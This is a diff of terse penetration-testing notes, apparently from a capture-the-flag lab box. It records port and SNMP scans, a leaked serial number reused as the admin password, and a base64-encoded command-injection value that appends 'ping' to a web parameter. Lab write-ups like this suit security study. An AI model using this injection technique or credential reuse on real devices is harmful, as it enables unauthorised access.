@@ -1,5 +1,7 @@
-nmap -sS -AO -p 1-65535 10.10.10.105
-nmap -sU -AO -p 1-65535 10.10.10.105
+
+### nmap -sT -p 1-65535 10.10.10.105
+### nmap -sU -AO -p 1-65535 10.10.10.105
+
 TCP:
 PORT   STATE    SERVICE VERSION
 21/tcp filtered ftp
@@ -20,4 +22,29 @@ UDP:
 PORT    STATE         SERVICE
 67/udp  open|filtered dhcps
 161/udp open          snmp
+
+### nmap -sU -p 161 -sV 10.10.10.105
+
+PORT    STATE SERVICE VERSION
+161/udp open  snmp    SNMPv1 server; pysnmp SNMPv3 server (public)
+
+### snmpwalk -c public -v 1 10.10.10.105
+
+Created directory: /var/lib/snmp/mib_indexes
+iso.3.6.1.2.1.47.1.1.1.1.11 = STRING: "SN#NET_45JDX23"
+End of MIB
+
+### gobuster -u http://10.10.10.105 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php -t 40
+
+in /doc found diagram and error codes.
+
+loged in using admin and serial number : admin:NET_45JDX23
+
+in Diagnostics found strange things;
+checked using Burp, found a value encoded with base64; after decoding it happens to be "quagga" which I can find on the site after clicking a button.
+Tryed exploit to RCE.
+### quagga; ping 10.10.14.71; ps quagga    encoded this string in base64
+### tcpdump -i tun0 icmp                   on my computer
+### entered encoded value to check parameter using burp. Got it
+
 
